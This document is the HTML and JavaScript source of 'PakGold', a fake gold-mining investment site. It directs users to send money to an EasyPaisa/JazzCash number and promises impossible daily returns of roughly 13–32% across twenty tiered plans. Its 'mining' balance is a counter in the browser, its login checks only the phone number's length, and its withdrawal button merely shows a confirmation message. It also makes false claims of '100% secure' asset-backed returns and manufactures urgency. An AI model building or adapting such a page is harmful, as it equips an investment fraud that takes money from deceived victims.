<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold | Ultimate Mining Ecosystem</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #f8fafc; --text: #1e293b; --white: #ffffff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        /* --- Transitions --- */
        .page { display: none !important; min-height: 100vh; padding-bottom: 100px; animation: slideUp 0.4s ease; }
        .page.active { display: block !important; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        /* --- Premium Login --- */
        #login-page { background: linear-gradient(-45deg, #fff, #fff9e6, #f1f5f9); background-size: 400% 400%; animation: flow 10s infinite; display: flex !important; align-items: center; justify-content: center; }
        @keyframes flow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .login-card { width: 90%; max-width: 400px; padding: 40px; background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); border-radius: 40px; border: 1px solid rgba(212,175,55,0.2); text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }

        /* --- Dashboard UI --- */
        .header { background: var(--white); padding: 50px 20px 30px; border-bottom: 4px solid var(--gold); border-radius: 0 0 40px 40px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.02); }
        .bal-box { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: white; padding: 25px; border-radius: 25px; margin: 20px 0; box-shadow: 0 10px 25px rgba(184,134,11,0.2); }
        
        /* --- Plan Cards --- */
        .container { padding: 20px; }
        .plan-grid { display: grid; gap: 15px; }
        .card { background: var(--white); padding: 20px; border-radius: 25px; border: 1px solid #eee; position: relative; overflow: hidden; transition: 0.3s; }
        .card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
        .badge { position: absolute; top: 12px; right: -25px; background: #ff4757; color: white; font-size: 0.6rem; padding: 4px 30px; transform: rotate(45deg); font-weight: 800; }
        .vip-badge { background: #1e293b !important; }
        .timer { font-size: 0.75rem; color: #ef4444; font-weight: 700; margin: 10px 0; display: block; }

        /* --- Buttons & Inputs --- */
        .btn { background: var(--gold-dark); color: white; border: none; padding: 15px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        input { width: 100%; padding: 16px; border-radius: 15px; border: 1px solid #ddd; margin-bottom: 15px; outline: none; background: #f8fafc; }

        /* --- Navigation --- */
        .nav { position: fixed; bottom: 0; width: 100%; background: var(--white); display: none; justify-content: space-around; padding: 15px; border-top: 1px solid #eee; border-radius: 30px 30px 0 0; box-shadow: 0 -10px 30px rgba(0,0,0,0.05); z-index: 2000; }
        .nav-item { text-align: center; font-size: 0.7rem; color: #94a3b8; cursor: pointer; transition: 0.3s; }
        .nav-item.active { color: var(--gold-dark); font-weight: 800; }

        /* --- History List --- */
        .hist-item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #eee; font-size: 0.8rem; }
    </style>
</head>
<body onload="init()">

    <!-- 1. LOGIN -->
    <section id="login" class="page active">
        <div class="login-card">
            <div style="font-size:3rem; margin-bottom:10px;">⚜️</div>
            <h1 style="color:var(--gold-dark)">PakGold</h1>
            <p style="color:#64748b; margin-bottom:30px;">Premium Mining Portal</p>
            <input type="text" id="ph" placeholder="Phone Number">
            <input type="password" id="ps" placeholder="Access Password">
            <button class="btn" onclick="handleAuth()">ENTER SECURELY</button>
        </div>
    </section>

    <!-- 2. HOME / DASHBOARD -->
    <section id="home" class="page">
        <div class="header">
            <p style="font-size:0.7rem; letter-spacing:1px; opacity:0.6;">MINING BALANCE</p>
            <h1 id="bal-txt" style="font-size:2.8rem; color:var(--gold-dark)">Rs 0.0000</h1>
            <div style="display:flex; gap:10px; margin-top:15px;">
                <button class="btn" style="padding:10px; font-size:0.8rem;" onclick="showTab('deposit')">Deposit</button>
                <button class="btn" style="padding:10px; font-size:0.8rem; background:#1e293b;" onclick="showTab('withdraw')">Withdraw</button>
            </div>
        </div>
        <div class="container">
            <h3 style="margin-bottom:15px;">Current Offers</h3>
            <div id="plans-container" class="plan-grid"></div>
        </div>
    </section>

    <!-- 3. DEPOSIT -->
    <section id="deposit" class="page">
        <div class="header"><h2>Add Funds</h2></div>
        <div class="container">
            <div class="card">
                <p>Transfer to: <b>EasyPaisa / JazzCash</b></p>
                <p style="margin:10px 0; color:var(--gold-dark)"><b>Number: 0322-1234567</b></p>
                <input type="number" id="d-amt" placeholder="Enter Amount">
                <input type="text" id="d-tid" placeholder="Transaction ID (TID)">
                <button class="btn" onclick="submitReq('Deposit')">CONFIRM DEPOSIT</button>
            </div>
        </div>
    </section>

    <!-- 4. WITHDRAW -->
    <section id="withdraw" class="page">
        <div class="header"><h2>Withdraw Profits</h2></div>
        <div class="container">
            <div class="card">
                <p>Available: <b id="w-bal-show">Rs 0.00</b></p>
                <input type="number" id="w-amt" placeholder="Amount (Min 600)">
                <input type="text" placeholder="Wallet Account Number">
                <button class="btn" style="background:#ef4444" onclick="submitReq('Withdraw')">REQUEST WITHDRAW</button>
            </div>
        </div>
    </section>

    <!-- 5. ABOUT & POLICY -->
    <section id="about" class="page">
        <div class="header"><h2>About & Privacy</h2></div>
        <div class="container">
            <div class="card">
                <h4>📜 Company Profile</h4>
                <p style="font-size:0.8rem; margin-top:10px;">PakGold is an international gold mining venture. We offer 100% secure daily returns backed by real assets.</p>
            </div>
            <div class="card">
                <h4>🔒 Privacy Policy</h4>
                <p style="font-size:0.8rem; margin-top:10px;">Your data is encrypted. Withdrawals are processed within 24 hours. Minimum withdrawal is Rs 600.</p>
            </div>
            <div class="card">
                <h4>🕒 History</h4>
                <div id="history-log">
                    <p style="font-size:0.7rem; opacity:0.5; text-align:center;">No recent transactions</p>
                </div>
            </div>
        </div>
    </section>

    <!-- NAVIGATION -->
    <nav class="nav" id="bot-nav">
        <div class="nav-item active" onclick="showTab('home')">🏠<br>Home</div>
        <div class="nav-item" onclick="showTab('deposit')">💰<br>Deposit</div>
        <div class="nav-item" onclick="showTab('withdraw')">💸<br>Withdraw</div>
        <div class="nav-item" onclick="showTab('about')">📜<br>Info</div>
    </nav>

    <script>
        // 15 Regular + 5 VIP Plans
        const plans = [
            {n:"Nano", p:500, d:65, v:false}, {n:"Starter", p:1000, d:135, v:false}, 
            {n:"Basic", p:2000, d:280, v:false}, {n:"Silver", p:3500, d:500, v:false},
            {n:"Gold", p:5000, d:750, v:false}, {n:"Platinum", p:8000, d:1250, v:false},
            {n:"Titanium", p:12000, d:1900, v:false}, {n:"Diamond", p:18000, d:3000, v:false},
            {n:"Master", p:25000, d:4200, v:false}, {n:"Expert", p:35000, d:6000, v:false},
            {n:"Veteran", p:50000, d:9000, v:false}, {n:"Elite", p:75000, d:14000, v:false},
            {n:"Commander", p:100000, d:20000, v:false}, {n:"Legend", p:150000, d:32000, v:false},
            {n:"Ultimate", p:200000, d:45000, v:false},
            {n:"VIP-1", p:300000, d:75000, v:true}, {n:"VIP-2", p:500000, d:130000, v:true},
            {n:"VIP-3", p:800000, d:220000, v:true}, {n:"VIP-4", p:1000000, d:300000, v:true},
            {n:"VIP-Crown", p:2000000, d:650000, v:true}
        ];

        function init() {
            if(localStorage.getItem('auth')) {
                showTab('home');
                startMining();
            }
            renderPlans();
        }

        function handleAuth() {
            let p = document.getElementById('ph').value;
            if(p.length < 10) return alert("Enter valid credentials sweetie! 💋");
            localStorage.setItem('auth', 'true');
            localStorage.setItem('bal', 0.0);
            location.reload();
        }

        function showTab(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('bot-nav').style.display = (id === 'login') ? 'none' : 'flex';
            
            // Highlight nav icons
            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
            if(id === 'home') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
            
            if(id === 'withdraw') document.getElementById('w-bal-show').innerText = "Rs " + localStorage.getItem('bal');
        }

        function renderPlans() {
            let container = document.getElementById('plans-container');
            plans.forEach(p => {
                container.innerHTML += `
                <div class="card">
                    ${p.v ? '<span class="badge vip-badge">VIP</span>' : '<span class="badge">LIMIT</span>'}
                    <h4 style="color:${p.v ? '#1e293b' : 'var(--gold-dark)'}">${p.n} Miner</h4>
                    <h2 style="margin:10px 0;">Rs ${p.p.toLocaleString()}</h2>
                    <p style="font-size:0.8rem; color:#64748b;">Daily Return: <b>Rs ${p.d.toLocaleString()}</b></p>
                    <span class="timer">⏳ Registration Closing Soon</span>
                    <button class="btn" style="padding:10px; font-size:0.8rem;" onclick="alert('Insufficient Balance!')">INVEST</button>
                </div>`;
            });
        }

        function startMining() {
            setInterval(() => {
                let b = parseFloat(localStorage.getItem('bal')) + 0.0005;
                localStorage.setItem('bal', b.toFixed(4));
                if(document.getElementById('bal-txt')) document.getElementById('bal-txt').innerText = "Rs " + b.toFixed(4);
            }, 1000);
        }

        function submitReq(type) {
            alert(type + " Request Submitted! Admin will verify soon sweetie. 💋");
            showTab('home');
        }
    </script>
</body>
</html>
